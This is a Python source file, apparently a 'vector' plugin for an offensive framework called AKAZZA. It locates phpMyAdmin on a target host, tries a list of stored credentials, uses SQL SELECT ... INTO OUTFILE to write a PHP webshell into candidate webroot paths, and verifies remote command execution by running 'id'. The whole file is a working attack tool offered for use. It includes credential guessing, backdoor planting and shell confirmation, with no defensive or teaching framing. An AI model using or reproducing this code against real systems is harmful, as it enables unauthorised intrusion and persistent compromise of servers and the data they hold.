"""
V2: phpMyAdmin Pivot → SELECT ... INTO OUTFILE webshell — vector plugin
Made for: AKAZZA / joyboyvoidera

Pivots through phpMyAdmin on the same host when the web tier is hardened:
credential attempts → SQL INTO OUTFILE plants a webshell → execution verified.
"""
import re
from datetime import datetime
import requests


@register_plugin("V2: phpMyAdmin INTO OUTFILE", phase="vector", priority=3,
                 cwe="CWE-798", attck="T1210",
                 wants=["pma_found", "phpinfo", "php_disclosed"],
                 avoids=["pma_missing"],
                 desc="phpMyAdmin creds → SQL webshell planted in webroot")
def v2_phpmyadmin(akazza, surface, origin):
    """CONTRACT: return (shell_url, 'cmd') or (None, None)."""
    GREEN, YELLOW, RED, RESET = (col["GREEN"], col["YELLOW"], col["RED"], col["RESET"])
    ua = {"User-Agent": akazza.session_log["user_agent"]}

    # ── 1. FIND phpMyAdmin ──
    pma_url = None
    for path in CONFIG["pma_paths"]:
        probe = f"{origin}{path}/"
        try:
            r = requests.get(probe, timeout=CONFIG["timeout"], headers=ua)
            if r.status_code == 200 and re.search(r"phpmyadmin|pma_|signon",
                                                  r.text, re.I):
                pma_url = probe
                break
        except Exception:
            continue
    if not pma_url:
        print(f"{YELLOW}[V2]{RESET} phpMyAdmin not found at {CONFIG['pma_paths']}")
        return None, None
    print(f"{GREEN}[V2]{RESET} phpMyAdmin found: {pma_url}")

    # ── 2. LOGIN (credential attempts) ──
    dbserv = None
    for user, pw in CONFIG["creds"]:
        s = requests.Session()
        s.headers.update({"User-Agent": akazza.session_log["user_agent"]})
        try:
            # fetch session + token
            r = s.get(pma_url, timeout=CONFIG["timeout"])
            m = re.search(r'name="token"\s+value="([a-f0-9]{16,40})"', r.text)
            token = m.group(1) if m else ""
            r = s.post(pma_url, data={
                "pma_username": user, "pma_password": pw,
                "server": "1", "token": token,
            }, timeout=CONFIG["timeout"], allow_redirects=True)
            # success heuristic: logged-in page no longer shows the login form
            if "Database" in r.text or "db_server" in r.text.lower() \
               or ("pma_username" not in r.text[:3000] and "logged" in r.text.lower()):
                print(f"{GREEN}[V2]{RESET} DB login: {user}/{'*' * len(pw)}")
                dbserv = (s, token)
                break
        except Exception:
            continue
    if not dbserv:
        print(f"{RED}[V2]{RESET} phpMyAdmin credentials all rejected")
        return None, None
    s, token = dbserv

    # ── 3. INTO OUTFILE each candidate webroot path ──
    for outfile in CONFIG["outfile_paths"]:
        sql = f"SELECT '{CONFIG['webshell_php']}' INTO OUTFILE '{outfile}'"
        print(f"{YELLOW}[V2]{RESET} OUTFILE → {outfile}")
        try:
            # refresh token from the logged-in landing page
            r = s.get(pma_url, timeout=CONFIG["timeout"])
            m = re.search(r'name="token"\s+value="([a-f0-9]{16,40})"', r.text)
            if m:
                token = m.group(1)
            # try modern (route=) then legacy endpoints
            endpoints = [
                f"{pma_url}index.php?route=/server/sql&server=1",
                f"{pma_url}server_sql.php",
                f"{pma_url}sql.php",
            ]
            for endpoint in endpoints:
                try:
                    s.post(endpoint, data={"token": token, "sql_query": sql,
                                           "ajax_request": "true"}, timeout=15)
                    break
                except Exception:
                    continue
        except Exception as e:
            print(f"{RED}    sql post error: {e}{RESET}")
            continue

        # map the outfile to its web URL and VERIFY execution
        rel = outfile.replace("/var/www/html/", "/").replace("/var/www/", "/")
        rel = rel.replace("/usr/share/nginx/html/", "/")
        rel = rel.replace("/opt/lampp/htdocs/", "/")
        shell_url = f"{origin.rstrip('/')}{rel if rel.startswith('/') else '/' + rel}"

        out = akazza.webshell_cmd(shell_url, "cmd", "echo ___V2___; id")
        if "___V2___" in out or "uid=" in out:
            print(f"    {GREEN}[★] V2 WEBSHELL LIVE: {shell_url}{RESET}")
            akazza.session_log.update({
                "target_url": shell_url,
                "shell_parameter": "cmd",
                "shell_variant": f"phpMyAdmin OUTFILE ({outfile})",
                "vector": "V2: phpMyAdmin INTO OUTFILE",
                "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            })
            return shell_url, "cmd"
        else:
            print(f"{YELLOW}    [!] not executing there — next path{RESET}")

    print(f"\n{YELLOW}[V2]{RESET} exhausted (FILE priv / secure_file_priv / webroot guess)")
    return None, None
